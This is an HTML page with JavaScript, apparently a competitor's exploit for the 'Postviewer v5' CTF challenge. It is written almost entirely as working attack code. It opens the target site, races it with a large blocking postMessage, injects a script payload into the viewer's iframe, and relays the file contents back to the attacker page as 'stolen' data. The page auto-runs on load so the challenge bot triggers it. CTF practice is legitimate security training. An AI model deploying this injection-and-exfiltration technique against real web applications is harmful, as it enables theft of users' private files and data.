<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Postviewer v5 FF Exploit v2</title>
</head>
<body>
    <h1>Postviewer v5 FF Exploit v2</h1>
    <button onclick="runExploit()">Click to Run Exploit</button>
    <iframe style="width:1px;height:1px" name="loop"></iframe>
    <pre id="log"></pre>

    <script>
        const TARGET_URL = 'https://eghbhvjs-postviewer5-ff.instancer.2025.ctfcompetition.com';
        const sleep = (d) => new Promise((r) => setTimeout(r, d));
        
        function log(...args) {
            console.log(...args);
            const logEl = document.getElementById('log');
            if (logEl) {
                logEl.innerText += args.join(' ') + '\n';
                logEl.scrollTop = logEl.scrollHeight;
            }
        }

        // Global message listener to catch any stolen data
        window.addEventListener('message', (e) => {
            if (e.data && (e.data.stolen || e.data.flag || e.data.type === 'flag_data')) {
                log('ðŸš© INTERCEPTED DATA:', JSON.stringify(e.data));
                if (e.data.stolen && e.data.stolen.includes('CTF{')) {
                    log('ðŸŽ‰ FLAG FOUND:', e.data.stolen);
                    alert('FLAG FOUND: ' + e.data.stolen);
                } else if (e.data.flag && e.data.flag.includes('CTF{')) {
                    log('ðŸŽ‰ FLAG FOUND:', e.data.flag);
                    alert('FLAG FOUND: ' + e.data.flag);
                }
            }
        });

        async function attemptExploit(win, fileIndex) {
            return new Promise(async (resolve) => {
                log(`Attempting file index ${fileIndex}`);
                
                try {
                    // Navigate to target with CSS selector
                    const url = `${TARGET_URL}/#file-${fileIndex}`;
                    log('Navigating to:', url);
                    win.location = url;
                    
                    // Wait for page load
                    await sleep(1000);
                    
                    // Check if iframe exists
                    let attempts = 0;
                    const maxAttempts = 10;
                    
                    while (attempts < maxAttempts) {
                        try {
                            if (win.length > 0) {
                                log(`Found ${win.length} iframe(s), attempting injection`);
                                
                                // Create large buffer to slow main thread
                                const buffer = new Uint8Array(5e6); // Smaller buffer, might be more reliable
                                
                                // Send blocking message
                                win.postMessage(buffer, '*', [buffer.buffer]);
                                
                                // Multiple injection attempts with different timings
                                for (let delay of [100, 200, 300, 500, 800]) {
                                    setTimeout(() => {
                                        const payload = {
                                            body: `<script>
                                                console.log('Exploit payload loaded in iframe');
                                                window.addEventListener('message', async (e) => {
                                                    console.log('Iframe received message:', e.data);
                                                    if (e.data && e.data.body) {
                                                        try {
                                                            let content = e.data.body;
                                                            if (typeof content !== 'string') {
                                                                if (content.text) content = await content.text();
                                                                else content = content.toString();
                                                            }
                                                            console.log('Extracted content:', content);
                                                            
                                                            // Multiple exfiltration methods
                                                            if (window.parent && window.parent.opener) {
                                                                window.parent.opener.postMessage({stolen: content, flag: content, type: 'flag_data'}, '*');
                                                            }
                                                            if (window.top && window.top.opener) {
                                                                window.top.opener.postMessage({stolen: content, flag: content, type: 'flag_data'}, '*');
                                                            }
                                                            if (window.opener) {
                                                                window.opener.postMessage({stolen: content, flag: content, type: 'flag_data'}, '*');
                                                            }
                                                        } catch (err) {
                                                            console.error('Content extraction error:', err);
                                                        }
                                                    }
                                                });
                                            <\/script>Hello from exploit iframe!`,
                                            mimeType: "text/html"
                                        };
                                        
                                        // Try to send to all possible iframe references
                                        try {
                                            if (win[0]) win[0].postMessage(payload, '*');
                                        } catch (e) { console.log('Failed to send to win[0]:', e); }
                                        
                                        try {
                                            if (win.frames[0]) win.frames[0].postMessage(payload, '*');
                                        } catch (e) { console.log('Failed to send to win.frames[0]:', e); }
                                        
                                        try {
                                            if (win.frames.length > 0) {
                                                for (let i = 0; i < win.frames.length; i++) {
                                                    win.frames[i].postMessage(payload, '*');
                                                }
                                            }
                                        } catch (e) { console.log('Failed to send to frames:', e); }
                                        
                                    }, delay);
                                }
                                
                                break;
                            }
                        } catch (e) {
                            log('Error checking iframe:', e.message);
                        }
                        
                        attempts++;
                        await sleep(200);
                    }
                    
                    // Wait for results
                    await sleep(2000);
                    
                } catch (error) {
                    log('Error in attemptExploit:', error.message);
                }
                
                resolve();
            });
        }

        let win;

        async function runExploit() {
            log('Starting improved exploit...');
            
            if (!win || win.closed) {
                win = open(TARGET_URL, 'exploit_target', 'width=800,height=600');
                log('Opened target window');
                await sleep(2000); // Give window time to load
            }

            // Try direct file access first
            log('Attempting direct file access...');
            for (let i = 1; i <= 5; i++) {
                await attemptExploit(win, i);
                await sleep(1000);
            }
            
            // Try CSS selector method
            log('Attempting CSS selector method...');
            for (let i = 1; i <= 5; i++) {
                try {
                    const url = `${TARGET_URL}/#a,.list-group-item:nth-child(${i})`;
                    log('Trying CSS selector:', url);
                    win.location = url;
                    await sleep(1500);
                    
                    if (win.length > 0) {
                        log('Found iframe via CSS selector');
                        await attemptExploit(win, `css${i}`);
                    }
                } catch (e) {
                    log('CSS selector attempt failed:', e.message);
                }
                await sleep(1000);
            }
            
            log('Exploit attempts completed');
        }

        // Auto-run after a delay to ensure everything is loaded
        window.addEventListener('load', () => {
            log('Exploit page loaded and ready');
            // Auto-run for bot
            setTimeout(() => {
                log('Auto-running exploit for bot...');
                runExploit();
            }, 2000);
        });
    </script>
</body>
</html>
